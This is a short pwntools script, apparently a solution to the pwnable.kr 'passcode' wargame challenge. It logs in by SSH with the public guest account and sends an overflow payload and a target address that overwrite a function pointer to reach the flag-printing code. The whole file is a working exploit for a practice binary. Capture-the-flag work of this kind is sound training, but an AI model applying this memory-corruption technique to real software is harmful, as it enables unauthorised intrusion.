from pwn import *
payload1 = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + (
    134520836).to_bytes(8, 'little')
print(payload1)
payload2 = (0x080485ea).to_bytes(8, 'little')
r = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
p = r.process(executable=b'./passcode')
p.sendlineafter(b"enter you name :", payload1)
p.sendlineafter(b"enter passcode1 :", payload2)
print(p.recvall())
r.close()
p.close()
